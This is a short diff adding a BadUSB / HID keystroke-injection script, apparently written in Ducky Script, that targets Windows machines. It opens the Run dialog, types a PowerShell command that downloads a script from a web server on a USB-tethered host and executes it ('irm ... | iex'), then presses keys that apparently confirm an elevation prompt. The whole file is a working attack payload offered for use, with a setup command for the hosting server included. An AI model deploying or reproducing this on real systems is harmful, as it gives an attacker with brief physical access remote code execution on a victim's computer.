@@ -1,0 +1,28 @@
+REM Author: ravindu644
+REM Github: https://github.com/ravindu644
+REM Title: RNDIS with USBTETHERING + HID Attack
+REM Description: Demonstration of executing a web attack from the python web server we built with: "cd ~ && mkdir -p web-scripts && cd web-scripts && python3 -m http.server 81 --bind 192.168.192.1"
+REM Target: Windows based
+REM VERSION: 1.0
+
+GUI r
+
+DELAY 250
+
+REM Adjust below value according to the script's name
+STRING powershell -Command "irm 192.168.192.1:81/mas | iex"
+
+DELAY 250
+
+ENTER
+
+REM Adjust below value according to the performance of the PC
+
+DELAY 1500
+
+LEFT
+
+DELAY 250
+
+ENTER
+
